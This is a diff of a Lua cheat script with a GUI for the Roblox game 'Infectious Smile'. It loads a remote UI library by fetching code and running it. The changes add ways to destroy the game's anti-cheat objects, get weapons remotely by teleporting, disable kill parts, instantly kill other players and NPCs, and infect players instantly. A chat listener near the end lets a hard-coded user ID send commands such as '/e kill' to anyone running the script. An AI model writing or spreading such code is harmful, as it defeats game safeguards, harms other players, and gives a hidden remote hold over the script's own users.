@@ -1,10 +1,8 @@
 local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
 
-local window = DrRayLibrary:Load("GUI", "Default")
+local window = DrRayLibrary:Load("Smile GUI: Infectious smile", "Default")
 
-local tab1 = DrRayLibrary.newTab("Infectious smile", "rbxassetid://1129583422")
-
-tab1.newLabel("Human")
+local tab1 = DrRayLibrary.newTab("Human", "rbxassetid://1129583422")
 
 local gettablesarray = newcclosure(function(...)
     local result = {} 
@@ -50,16 +48,12 @@ tab1.newToggle("Auto fast weapons", "I think the name makes it clear what it doe
   end
 end)
 
-tab1.newToggle("Remove killbricks", "Makes untouchable all part that instantly kill you", false, function(toggleState)
-    if toggleState then
-
-for _, part in next, workspace:GetDescendants() do
-  if part:IsA("BasePart") and part:FindFirstChild("TouchInterest") and part.Parent.Name ~= "AntiSmiler" and part.Parent.Name ~= "Infector" then
-part.CanTouch = not toggleState
-  end
-end
-  
-    end
+tab1.newToggle("Disable killbricks", "Makes untouchable all part that instantly kill you", false, function(toggleState)
+   for _, part in next, game.Workspace.Map:GetDescendants() do
+      if part:IsA("BasePart") and part:FindFirstChild("TouchInterest") and string.find(part.Name, "Kill") then
+         part.CanTouch = not toggleState
+      end
+   end
 end)
 
 local savedreach = 0
@@ -97,31 +91,28 @@ end
   end)
 end)
 
-tab1.newToggle("Weapon giver", "Press this button to turn it on (works remotely)", false, function(toggleState)
-        game:GetService("CoreGui").PurchasePrompt.Enabled = not toggleState
-ioon = toggleState
-while ioon and task.wait(.5) do
-for i,v in next, workspace:GetDescendants() do
-   if v:IsA("ClickDetector") then
-     fireclickdetector(v)
-   end
-end
- end
- 
+tab1.newButton("Get main weapon", "Gives weapons", function()
+local last_pick_sin_mrazy, bac = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, game.Players.LocalPlayer.Backpack
+  
+  repeat task.wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Map.HumanBase.Vendor.BatCollection.HitBox.CFrame
+    game.Workspace.Map.HumanBase.Vendor.BatCollection.ClickDetector.MaxActivationDistance = math.huge
+    fireclickdetector(game.Workspace.Map.HumanBase.Vendor.BatCollection.ClickDetector)
+  until bac:FindFirstChild(game.Players.LocalPlayer.Marketplace["Main Weapon"].Equipped.Value) task.wait()
+ repeat task.wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy until game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame == last_pick_sin_mrazy
 end)
 
-tab1.newButton("Get weapons", "Gives weapons", function()
-last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
-
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-18, 6, -14)
-task.wait()
-for i,v in pairs(workspace:GetDescendants()) do
-   if v:IsA("ClickDetector") then
-    fireclickdetector(v)
-   end
-end
-task.wait()
-game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy
+tab1.newButton("Get all special weapons", "Gives all special weapons for example shotgun. Cannot get locked guns", function()
+ for _, gun in next, Workspace.Map.System:GetDescendants() do
+  if gun:IsA("ClickDetector") and table.find({"FirePotionCollection", "ShotgunCollection", "KnifeCollection", "HatchetCollection", "RustyShovelCollection", "WaterJugCollection", "HandgunCollection", "ShovelCollection"}, gun.Parent.Name) and not gun.Parent:FindFirstAncestor("Locker") then
+    local name, pos, past = table.concat(string.split(string.gsub(gun.Parent.Name, "Collection", ""), "%l"), " "), game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, tick()
+    repeat task.wait()
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gun.Parent:FindFirstChildWhichIsA("BasePart").CFrame
+      fireclickdetector(gun)
+    until game.Players.LocalPlayer.Backpack:FindFirstChild(name) or tick() - past >= 1.5 task.wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+  end
+ end
 end)
 
 tab1.newButton("Delete tool", "Removes tool in hand", function()
@@ -136,8 +127,8 @@ game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
 end)
 
 tab1.newToggle("Anti infection", "You won't be able to get infected except the players", false, function(togl)
-    for _, part in next, workspace:GetDescendants() do
-      if part:IsA("BasePart") and part.Parent.Name == "Infector" then
+    for _, part in next, workspace.Map:GetDescendants() do
+      if part:IsA("BasePart") and string.find(part.Parent.Name, "Infector") then
  part.Transparency = togl and 0.25 or 0
  part.CanTouch = not togl
       end
@@ -155,30 +146,31 @@ llkn = toggleState
     end
 end)
 
-tab1.newButton("AntiCheat destroy", "Removes killbricks outside the server boundary", function()
-    workspace.Map.AntiHack:Destroy() 
-    game.Players.LocalPlayer.Character.AntiFly:Destroy()
+tab1.newButton("AntiCheat destroy", "Removes killbricks outside the server boundary and new anti cheat", function()
+   workspace.Map.AntiHack:Destroy() 
+   game.Players.LocalPlayer.Character.StayOnPart:Destroy()
+   game.Players.LocalPlayer.Character.HumanoidInit:Destroy()
 end)
 
-tab1.newLabel("Smile")
+local tab1 = DrRayLibrary.newTab("Smile", "rbxassetid://1129583422")
 
 tab1.newButton("Infect", "Infects you", function()
     firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map.Infectors.Infector.Part, 0)
-    game.Players.LocalPlayer.Character.Infected.InfectedSpeed.Value = 0
 end)
 
 tab1.newInput("Reach hitbox", "Increases the distance from which you can grab a player", function(num)
   local hitbox = Instance.new("SelectionBox", game.Players.LocalPlayer.Character.Torso.Part)
   hitbox.Adornee = game.Players.LocalPlayer.Character.Torso.Part
+  
   game.Players.LocalPlayer.Character.Torso.Part.Massless = true
   game.Players.LocalPlayer.Character.Torso.Part.Size = Vector3.new(7, 2, num)
 end)
 
-tab1.newToggle("Anti Yellow doors", "Removes yellow doors", false, function(togle)
-    for _, part in next, workspace:GetDescendants() do
-      if part:IsA("BasePart") and part.Parent.Name == "AntiSmiler" then
- part.Transparency = togle and 0.5 or 0
- part.CanTouch = not togle
+tab1.newToggle("Disable anti smilers", "All orange objects will be inviolable to you", false, function(togle)
+    for _, part in next, workspace.Map:GetDescendants() do
+      if part:IsA("BasePart") and (string.find(part.Parent.Name, "AntiInfect") or (part.BrickColor == Workspace.Map.Misc.Spearer.Spear3.Spear.Spearhead.BrickColor and part.Material == "Neon")) then
+        part.Transparency = togle and 0.25 or 0
+        part.CanTouch = not togle
       end
     end
 end)
@@ -205,14 +197,19 @@ end
     end
 end)
 
-tab1.newToggle("Infect grab", "You infect player instantly after you grab him", false, function(bol)
+tab1.newToggle("Instant kill grab", "You you kill players so fast that you don\'t even have time to infect them", false, function(bol)
   poohh = bol
     while poohh and task.wait() do
 for _, player in next, game.Players:GetPlayers() do
  pcall(function()
   if player ~= game.Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart and isnetworkowner(player.Character.HumanoidRootPart) then
     pcall(function()
-firetouchinterest(player.Character.HumanoidRootPart, workspace.Map.Infectors.Infector.Part, 0)
+      for _, part in next, Workspace.Map:GetDescendants() do
+        if part:IsA("BasePart") and part:FindFirstChildWhichIsA("TouchTransmitter") then
+          firetouchinterest(player.Character.HumanoidRootPart, part, 0)
+          firetouchinterest(player.Character.HumanoidRootPart, part, 1)
+        end
+      end
     end)
   end
  end)
@@ -236,7 +233,6 @@ end
     end
 end)
 
-
 tab1.newToggle("Anti stun", "You cant be stunned", false, function(togli)
  yhik = togli
  while yhik and task.wait() do
@@ -252,10 +248,12 @@ tab1.newToggle("Anti stun", "You cant be stunned", false, function(togli)
 end)
 
 tab1.newButton("Instant infect", "You can quickly infect players", function()
- if game.Players.LocalPlayer.Character:FindFirstChild("Infected") then
-  game.Players.LocalPlayer.Character.Infected.Infect.Cooldown.Value = 0
- end
+  if game.Players.LocalPlayer.Character:FindFirstChild("Infected") then
+   game.Players.LocalPlayer.Character.Infected.Infect.Cooldown.Value = 0
+  end
 end)
+
+local tab1 = DrRayLibrary.newTab("Events", "rbxassetid://1129583422")
 
 tab1.newToggle("Auto collecting coins", "Collects everything SmileCoins", false, function(toggleState)
 jjj = toggleState
@@ -269,8 +267,6 @@ end)
    end
  end
 end)
-
-tab1.newLabel("Events")
 
 tab1.newButton("Fullbright", "You will see in the dark", function()
     pcall(function()
@@ -302,7 +298,7 @@ tab1.newButton("Fullbright", "You will see in the dark", function()
 end)
 end)
 
-tab1.newButton("No fog", "Helps against the rich", function()
+tab1.newButton("Remove fog", "Helps against the rich", function()
     game.Lighting.FogStart = math.huge
     game.Lighting.FogEnd = math.huge
     game.Lighting.FogColor = Color3.new(0,0,0)
@@ -316,25 +312,32 @@ workspace.CurrentCamera.CFrame = CFrame.new(-20, 6, -10) * CFrame.Angles(0, math
 workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
 end)
 
-tab1.newButton("Anti black hole", "You don't get distracted by explosions", function()
-    local plr = game.Players.LocalPlayer
-local char = plr.Character
-  for _, child in pairs(char:GetChildren()) do
-    if child:IsA("BasePart") then
-      child.Massless = false
-      child.CustomPhysicalProperties = PhysicalProperties.new(math.huge, math.huge, math.huge) 
-    end
-  end
+tab1.newToggle("Anti black hole", "You don't get distracted by explosions", false, function(value)
+ pow = value
+ while pow and task.wait() do
+   for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+     if child:IsA("BodyMover") then
+       child:Destroy()
+     end
+   end
+ end
 end)
 
-tab1.newButton("Kill all NPCs", "Kills NPC entities (if you damage them, their HP will be restored)", function()
-sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 112412400000)
-sethiddenproperty(game.Players.LocalPlayer, "MaxSimulationRadius", 112412400000)
-for i, d in pairs(game.Workspace:GetDescendants()) do
-    if d.ClassName == 'Humanoid' and not game.Players:FindFirstChild(d.Parent.Name) then
-        d.Health = 0
+tab1.newToggle("Kill nearest NPCs", "Kills nearest NPCs", false, function(Value)
+   yoo = Value
+while yoo and task.wait() do
+ if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+   local parts = workspace:GetPartBoundsInRadius(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, 45)
+    for _, part in next, parts do
+      if part.Anchored == false and not game.Players:GetPlayerFromCharacter(part.Parent) and part.Parent:FindFirstChildOfClass("Humanoid") then
+       local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
+        game.Players.LocalPlayer.SimulationRadius = math.huge
+        humanoid.Health = 0
+        humanoid:TakeDamage(math.huge)
+      end
     end
-end
+  end
+ end
 end)
 
 tab1.newLabel("GUIS")
@@ -365,7 +368,7 @@ end)
 
 local admins = {4636825706}
 game:GetService("TextChatService").MessageReceived:Connect(function(info)
-  if table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.CharacterAppearanceId) and not game.Players.LocalPlayer:IsFriendsWith(info.TextSource.UserId) then
+  if info.TextSource and table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.UserId) and not game.Players.LocalPlayer:IsFriendsWith(info.TextSource.UserId) then
    local player = game.Players:GetPlayerByUserId(info.TextSource.UserId)
       if info.Text:lower() == "/e kill" then
         game.Players.LocalPlayer.Character.Humanoid.Health = 0
